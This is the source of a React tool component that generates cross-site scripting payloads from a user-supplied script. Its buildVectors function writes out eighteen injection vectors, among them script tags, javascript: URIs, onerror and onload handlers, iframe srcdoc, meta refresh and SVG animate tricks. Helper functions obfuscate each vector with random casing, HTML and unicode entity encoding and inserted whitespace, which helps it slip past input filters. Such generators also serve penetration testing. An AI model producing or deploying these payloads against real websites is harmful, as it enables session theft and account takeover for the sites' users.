import { memo, useMemo, useState } from 'react';
import { useTranslation } from 'react-i18next';
import CopyButton from '../components/CopyButton';
import GlassButton from '../components/GlassButton';
import GlassInput from '../components/GlassInput';
import ToolLayout from '../components/ToolLayout';

function randomizeCase(input: string): string {
  return input.split('').map((c) => (Math.random() < 0.4 ? c.toUpperCase() : c.toLowerCase())).join('');
}

function randomizeEntity(input: string): string {
  return input.split('').map((char) => {
    const r = Math.random();
    if (char === ':') return '&colon;';
    if (char === ';') return '&semi;';
    if (char === "'") return '&apos;';
    if (char === '"') return '&quot;';
    if (char === ' ') return '&nbsp;';
    if (char === '<') return '&lt;';
    if (char === '>') return '&gt;';
    if (char === '&') return '&amp;';
    if (char === '\t') return '&#x09;';
    if (char === '\n') return '&#x0a;';
    if (r < 0.1) return `&#${char.charCodeAt(0)};`;
    if (r < 0.2) return `&#x${char.charCodeAt(0).toString(16)};`;
    return char;
  }).join('');
}

function randomizeUnicode(input: string): string {
  return input.split('').map((char) => (Math.random() < 0.2 ? `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char)).join('');
}

function htmlEntityEncode(input: string): string {
  return input.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c] as string);
}

function insertRandomChar(word: string, chars: string[]): string {
  return word.split('').map((c, i) => (i > 0 && Math.random() < 0.3 ? `${chars[Math.floor(Math.random() * chars.length)]}${c}` : c)).join('');
}

function buildVectors(payload: string): string[] {
  const jsUri = () => `${randomizeCase(insertRandomChar('javascript', ['\t', '\n']))}:${payload};`;
  return [
    `<${randomizeCase('script')}>${randomizeUnicode(payload)}</${randomizeCase('script')}>`,
    `<${randomizeCase('a')} ${randomizeCase('href')}="${randomizeEntity(jsUri())}">XSS</${randomizeCase('a')}>`,
    `<${randomizeCase('body')} ${randomizeCase('onload')}="${randomizeEntity(payload)}">`,
    `<${randomizeCase('embed')} ${randomizeCase('src')}="${randomizeEntity(jsUri())}">`,
    `<${randomizeCase('form')} ${randomizeCase('action')}="${randomizeEntity(jsUri())}"><${randomizeCase('input')} type=submit value=XSS>`,
    `<${randomizeCase('form')} ${randomizeCase('action')}="${randomizeEntity(jsUri())}"><${randomizeCase('input')} type=submit id=x></form><${randomizeCase('label')} for=x>XSS</${randomizeCase('label')}>`,
    `<${randomizeCase('form')}><${randomizeCase('button')} ${randomizeCase('formaction')}="${randomizeEntity(jsUri())}">XSS</${randomizeCase('button')}>`,
    `<${randomizeCase('form')}><${randomizeCase('input')} type=submit ${randomizeCase('formaction')}="${randomizeEntity(jsUri())}" value=XSS>`,
    `<${randomizeCase('iframe')} ${randomizeCase('srcdoc')}="${htmlEntityEncode(`<img src=1 onerror='`)}${payload}'>"></${randomizeCase('iframe')}>`,
    `<${randomizeCase('iframe')} ${randomizeCase('src')}="${randomizeEntity(jsUri())}"></${randomizeCase('iframe')}>`,
    `<${randomizeCase('img')} src=x ${randomizeCase('onerror')}="${htmlEntityEncode(payload)}">`,
    `<${randomizeCase('meta')} http-equiv="refresh" content="0; url=${randomizeEntity(jsUri())}">`,
    `<${randomizeCase('object')} ${randomizeCase('data')}="${randomizeEntity(jsUri())}">`,
    `<${randomizeCase('script')} ${randomizeCase('src')}="data:text/javascript,${payload}"></${randomizeCase('script')}>`,
    `<${randomizeCase('script')}>import('data:text/javascript,${payload}')</${randomizeCase('script')}>`,
    `<${randomizeCase('svg')}><${randomizeCase('a')} xlink:href="${randomizeEntity(jsUri())}"><${randomizeCase('text')} x="20" y="20">XSS</text></${randomizeCase('a')}>`,
    `<${randomizeCase('svg')}><${randomizeCase('animate')} xlink:href=#xss attributeName=href values="${randomizeEntity(jsUri())}" /><${randomizeCase('a')} id=xss><text x=20 y=20>XSS</text></${randomizeCase('a')}>`,
    `<${randomizeCase('svg')}><${randomizeCase('set')} xlink:href=#xss attributeName=href from=? to="${randomizeEntity(jsUri())}" /><${randomizeCase('a')} id=xss><text x=20 y=20>XSS</text></${randomizeCase('a')}>`,
  ];
}

const XssVectorTool = memo(function XssVectorTool() {
  const { t } = useTranslation();
  const [payload, setPayload] = useState('alert(1)');
  const [seed, setSeed] = useState(0);

  const vectors = useMemo(() => {
    void seed;
    return buildVectors(payload || 'alert(1)');
  }, [payload, seed]);

  return (
    <ToolLayout id="xss-vector" color="#f87171">
      <div className="flex flex-col gap-4">
        <div className="flex flex-wrap items-end gap-3">
          <label className="min-w-[16rem] flex-1 text-sm text-[var(--color-text-muted)]">
            {t('tools.xss-vector.payload')}
            <GlassInput aria-label={t('tools.xss-vector.payload')} className="mt-1 font-mono" value={payload} onChange={(e) => setPayload(e.target.value)} />
          </label>
          <GlassButton onClick={() => setSeed((s) => s + 1)}>{t('tools.xss-vector.regenerate')}</GlassButton>
        </div>
        <div className="flex flex-col gap-2">
          {vectors.map((code, i) => (
            <div key={i} className="glass-card flex items-start gap-2 p-3">
              <pre className="mono-panel min-w-0 flex-1 whitespace-pre-wrap break-all text-xs">{code}</pre>
              <CopyButton value={code} />
            </div>
          ))}
        </div>
        <p className="text-xs text-[var(--color-text-muted)]">{t('tools.xss-vector.hint')}</p>
      </div>
    </ToolLayout>
  );
});

export default XssVectorTool;
